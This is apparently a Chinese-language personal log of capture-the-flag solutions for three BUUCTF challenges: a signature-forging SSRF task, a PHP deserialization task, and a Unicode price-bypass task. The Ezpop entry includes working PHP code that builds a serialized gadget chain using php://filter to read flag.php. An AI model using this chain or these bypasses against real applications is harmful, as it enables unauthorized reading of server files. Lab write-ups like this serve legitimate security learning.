编号      日期                 题目               平台         介绍
 1     2026/4/27      [De1CTF 2019]SSRF Me      BUUCTF        此题只是单纯的考验代码审计加一点SSRF，可以得知我最终要对De1ta伪造三个参数，即sign，param，action，其中param是flag.txt,action是readscan,
                                                              sign是某个加密函数（param，action）（之后这个函数成为A），只要让sign合理即可成功攻击，
                                                              又在另一个页面可以得知可以上传param参数使得到A(param,'scan')的结果，又因为他的A函数里都是使用加号拼接param和'scan'之后加密，所以在这个
                                                              页面上传param=flag.txtread，这样就可以得到sign
                                                              最后把param，action和sign上传到第一个也买你De1ta就可以成功

2      2026/5/11          [MRCTF2020]Ezpop      BUUCTF        进入页面，看到php代码，并且有三个类：Test，Show，Modifier。
                                                                 1、Modifier中有include，并且有__invoke方法（当对象被当做函数被调用时候执行）。
                                                                 2、Test类中有__get方法（当对象中的私有变量或者不存在的变量被访问时候执行），该方法会$function = $this->p; return $function();
                                                                 3、Show中有个__wakeup方法（反序列化时候调用），还有 __toString方法（对象被当做字符串时候执行），并且weakup中有
                                                                   preg_match（...,this->source），__toString中有 return $this->str->source;
                                                                 4、main中反序列化pop参数的值  
                                                               解决方法：创建两个Show的对象s1，s2，s1的source就是s2，这样反序列化就触发s2的__toString方法，s2的str为Test类的对象t，这样会触发t的
                                                                              __get方法
                                                                         t对象的p成员是m，m是Modifier的对象，这样就会把m当作函数，所以触发m的__invoke方法
                                                                         m的成员变量var是php://filter/convert.base64-encode/resource=flag.php
                                                                         并且最后要urlencode序列化的字符串
                                                               代码：
                                                                       <?php
                                                                       class Modifier {
                                                                           protected $var = 'php://filter/convert.base64-encode/resource=flag.php';
                                                                       }
                                                                       
                                                                       class Test {
                                                                           public $p;
                                                                       }
                                                                       
                                                                       class Show {
                                                                           public $source;
                                                                           public $str;
                                                                       }
                                                                       $m = new Modifier();
                                                                       $t = new Test();
                                                                       $t->p = $m;
                                                                       $s2 = new Show();
                                                                       $s2->str = $t;      
                                                                       $s2->source = 'aaa'; 
                                                                       $s1 = new Show();
                                                                       $s1->str = 'aaa';   
                                                                       $s1->source = $s2; 
                                                                       
                                                                       echo urlencode(serialize($s1));
                                                                       ?>          
                                                                                                                                                  
                                                                              
3      2026/5/16      [ASIS 2019]Unicorn shop   BUUCTF         进入页面，点击购买，有提示 unicodedata.numeric(price)  ，猜测他把用户输入price进行numeric方法，该方法是要求price只能为一个字符，并且
                                                               可以适配unicode，所以我输入零，它会变成0.0
                                                               所以解决方法就是输入商品ID为4，价格为万,原因是该商品的价格是1000多，但只能输入单字符，所以只能使用万之类的绕过。
